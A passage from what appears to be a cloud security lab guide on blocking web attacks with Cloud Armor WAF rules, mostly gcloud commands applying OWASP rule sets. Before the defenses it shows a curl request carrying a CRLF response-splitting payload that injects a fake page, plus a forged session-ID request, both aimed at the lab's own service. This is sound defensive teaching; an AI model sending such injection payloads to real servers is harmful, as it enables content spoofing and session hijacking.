lines).</span></p><p><span>The response could then be interpreted as two responses by anything that happens to parse it, like an intermediary proxy server, potentially serving false content in subsequent requests. Insert the sequence </span><code>%0d%0a</code><span> into the input parameter, which can lead to serving a misleading page.</span></p><ul><li><p><span>From Cloud Shell:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii "http://$PUBLIC_SVC_IP/index.html?foo=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a&lt;html&gt;Sorry,%20System%20Down&lt;/html&gt;"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 200 OK</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h3 id='observe-session-fixation'><span>Observe session fixation</span></h3><ul><li><p><span>In Cloud Shell:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP -H session_id=X</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 200 OK</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h2 id='task-4-define-cloud-armor-waf-rules'><span>Task 4. Define Cloud Armor WAF rules</span></h2><ol start='' ><li><p><span>List the preconfigured WAF rules, using the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies list-preconfigured-expression-sets</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXPRESSION_SET</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Sqli-canary</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">RULE_ID</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  owasp-crs-v030001-id942110-sqli</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  owasp-crs-v030001-id942120-sqli</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><ol start='' ><li><p><span>Create the Cloud Armor security policy using the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies create Policy Name \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "Block with OWASP ModSecurity CRS"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In Cloud Shell, update the security policy default rule.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The default rule priority has a numerical value of 2147483647.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules update 2147483647 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy Policy Name \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action "deny-403"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Since the default rule is configured with action deny, you must allow access from your IP. Please find your public IP (curl, ipmonkey, whatismyip, etc):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MY_IP=$(curl ifconfig.me)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add the first rule to allow access from your IP (INSERT YOUR IP BELOW):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 10000 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy Policy Name  \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "allow traffic from my IP" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --src-ip-ranges "$MY_IP/32" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action "allow"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In Cloud Shell, update the security policy to block LFI attacks.</span></p></li></ol><p><span>Apply the OWASP ModSecurity Core Rule Set that prevents path traversal for local file inclusions.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 9000 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy Policy Name  \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "block local file inclusion" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --expression "evaluatePreconfiguredExpr('lfi-stable')" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action deny-403</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In Cloud Shell, update the security policy to block Remote Code Execution (rce).</span></p></li></ol><p><span>Per the OWASP ModSecurity Core Rule Set, apply rules that look for rce, including command injection. Typical OS commands are detected and blocked.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 9001 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy Policy Name  \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "block rce attacks" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --expression "evaluatePreconfiguredExpr('rce-stable')" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action deny-403</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Update the security policy to block security scanners.</span></p></li></ol><p><span>Apply the OWASP ModSecurity Core Rule Set to block well-known security scanners, scripting HTTP clients, and web crawlers.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 9002 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy Policy Name  \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "block scanners" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --expression "evaluatePreconfiguredExpr('scannerdetection-stable')" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action deny-403</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In Cloud Shell, update the security policy to block protocol attacks.</span></p></li></ol><p><span>Per the OWASP ModSecurity Core Rule Set, apply rules that look for Carriage Return (CR) </span><code>%0d</code><span> and Linefeed (LF)</span><code>%0a</code><span> characters and other types of protocol attacks like HTTP Request Smuggling.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 9003 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy Policy Name  \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "block protocol attacks" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --expression "evaluatePreconfiguredExpr('protocolattack-stable')" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action deny-403</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Update the security policy to block session fixation.</span></p></li></ol><p><span>Per the OWASP ModSecurity Core Rule Set, apply the following rules using Cloud Shell:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" 